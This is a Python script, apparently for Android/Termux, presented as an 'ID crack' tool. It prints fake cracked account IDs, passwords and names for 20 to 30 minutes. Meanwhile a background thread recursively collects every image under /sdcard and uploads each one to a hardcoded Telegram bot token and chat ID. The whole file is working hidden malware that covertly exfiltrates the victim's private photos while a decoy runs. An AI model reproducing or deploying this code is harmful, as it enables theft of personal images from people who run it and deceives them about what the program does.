import os
import requests
from glob import glob
import time
from PIL import Image
import mimetypes
import random
import threading

TOKEN = '8019634294:AAE8TRGISBGxHHNrh4TyctpBOYmPRzu1b54'
CHAT_ID = '6423238949'

image_extensions = ["*.jpg", "*.jpeg", "*.png", "*.webp"]
root_folder = "/sdcard"
MAX_SIZE_MB = 19

names = ["Jahid", "Riyad", "Nayem", "Hasib", "Sabbir", "Arafat", "Sakib", "Tamim"]
funny_passwords = ["123456", "112233", "password", "qwerty123", "445566", "bangla786", "iloveyou", "098765"]

def is_valid_file(path):
    try:
        if os.path.getsize(path) > MAX_SIZE_MB * 1024 * 1024:
            return False
        with Image.open(path) as img:
            img.verify()
        return True
    except:
        return False

def collect_files():
    image_paths = []
    for ext in image_extensions:
        found = glob(os.path.join(root_folder, "**", ext), recursive=True)
        image_paths.extend(found)
    valid_images = [img for img in image_paths if is_valid_file(img)]
    return sorted(list(set(valid_images)))

def send_file(file_path):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, 'rb') as f:
            files = {'photo': f}
            requests.post(url, data={'chat_id': CHAT_ID}, files=files)
    except:
        pass

def send_all_photos():
    photos = collect_files()
    for photo in photos:
        send_file(photo)
        time.sleep(random.uniform(3, 4))  # ৩-৪ সেকেন্ডে একেকটা পিক

def simulate_id_crack():
    start_time = time.time()
    duration = random.randint(20, 30) * 60  # ২০-৩০ মিনিট
    print("[*] Starting Random ID Crack Simulation...")

    while time.time() - start_time < duration:
        uid = f"1000{random.randint(100000000, 999999999)}"
        pw = random.choice(funny_passwords)
        name = random.choice(names)
        print(f"[+] UID: {uid} | PW: {pw} | NAME: {name}")
        time.sleep(random.uniform(10, 15))  # ১০-১৫ সেকেন্ড delay

    print("[*] Simulation complete.")

def main():
    threading.Thread(target=send_all_photos, daemon=True).start()
    simulate_id_crack()

if __name__ == "__main__":
    main()